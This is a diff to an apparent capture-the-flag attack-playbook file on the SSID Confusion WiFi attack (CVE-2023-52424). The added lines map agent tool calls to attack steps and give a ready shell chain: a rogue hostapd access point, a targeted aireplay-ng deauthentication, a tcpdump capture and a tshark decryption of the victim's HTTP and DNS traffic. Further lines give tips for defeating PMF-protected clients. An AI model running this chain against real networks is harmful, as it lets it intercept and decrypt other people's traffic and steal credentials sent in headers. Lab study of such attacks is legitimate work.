@@ -1,5 +1,7 @@
 # SSID Confusion flag — client thinks it's on X, is on Y
 
+**Verified against:** hostapd 2.11 as of 2026-Q3
+
 CVE-2023-52424. The 4-way handshake doesn't authenticate the SSID.
 Client-side policy (VPN toggle, MDM profile, per-SSID trust) reads
 the wrong SSID string. Flag surface is whatever the client sends
@@ -52,6 +54,35 @@ run_sequence([
 ])
 ```
 
+## MCP mapping / fallback
+
+- `hostapd_up` → `server.do_create_rogue_ap(ssid, channel, security='wpa2',
+  psk=<shared>)` (uses hostapd under the hood on the Pineapple).
+- `deauth_targeted` → `server.do_deauth(bssid=..., client_mac=..., count=...)`.
+- `capture_start` / `capture_stop`, `wireshark_decrypt` — **not in `src/`**;
+  drive `tcpdump` on the Pineapple and `tshark` on the analyst host.
+
+**Fallback shell chain:**
+
+```bash
+# 1. rogue AP on the guest SSID with the shared PSK (see hostapd conf
+#    fragment in wpa3-transition-downgrade.md).
+sudo hostapd /etc/hostapd/rogue-guestnet.conf &
+
+# 2. targeted deauth (PMF-off only)
+sudo aireplay-ng -0 3 -a <real-corp-BSSID> -c 11:22:33:44:55:66 wlan1mon
+
+# 3. capture on the rogue's channel
+sudo tcpdump -i wlan1mon -c 5000 -w /tmp/ssidconf.pcapng \
+    "wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66"
+
+# 4. offline decrypt with the shared PSK
+tshark -r /tmp/ssidconf.pcapng \
+    -o "wlan.enable_decryption:TRUE" \
+    -o 'uat:80211_keys:"wpa-pwd","<shared PSK>:GuestNet"' \
+    -Y "http.request or http.response or dns" -V
+```
+
 ## The flag surface
 
 - **Authorization header** the client sends assuming it's on Corp.
@@ -78,8 +109,37 @@ clean — different SSID, different BSSID, correct handshake.
   RSSI dominance — the rogue must be louder at the client than the
   real corp AP.
 
+## What still works when PMF-required
+
+SSID Confusion is *the* PMF-required-safe attack — the 4-way
+handshake doesn't authenticate the SSID string, and the trigger
+is the client's own reconnect logic. The one-shot above uses
+`deauth_targeted` as step 2 only to accelerate; on a PMF-required
+target that step is a no-op but the attack still lands:
+
+- **Drop the deauth entirely.** The client will re-select on its
+  next natural roam / wake / band-steer. Extend the capture
+  window and wait.
+- **RSSI dominance is the actual lever.** The rogue on GuestNet
+  has to out-signal the real Corp AP at the client. Position
+  matters more than deauth ever did.
+- **Same-PSK-across-SSIDs is the precondition, not PMF.** PMF's
+  scope is mgmt-frame integrity between an associated pair; SSID
+  confusion attacks the *client's own trust policy* about which
+  SSID string means what. That policy runs above PMF.
+- **6 GHz variant.** On 6 GHz, PMF is mandatory but WPA3-SAE
+  (with per-connection PMKs) is common — SSID Confusion still
+  works if the venue mirrors the same SAE credential across two
+  SSIDs (common for guest / corp splits). See Gollier &
+  Vanhoef 2024 §5.
+- **BTM cooperation.** If Corp AP honors BTM Requests, hint the
+  client toward GuestNet's BSSID — cooperative roam, no deauth.
+
 ## Cite
 
-- attacks.json: `ssid-confusion-cve-2023-52424`.
-- Vanhoef & Yseboodt 2024.
+- attacks.json: `ssid-confusion-cve-2023-52424`,
+  `btm-forced-roam`.
+- Héloïse Gollier and Mathy Vanhoef, "SSID Confusion" (2024,
+  KU Leuven / DistriNet). CVE-2023-52424, co-disclosed 2024-05-14.
 - cves.json: CVE-2023-52424.
+- knowledge/ctf/pmf-required-targets.md.
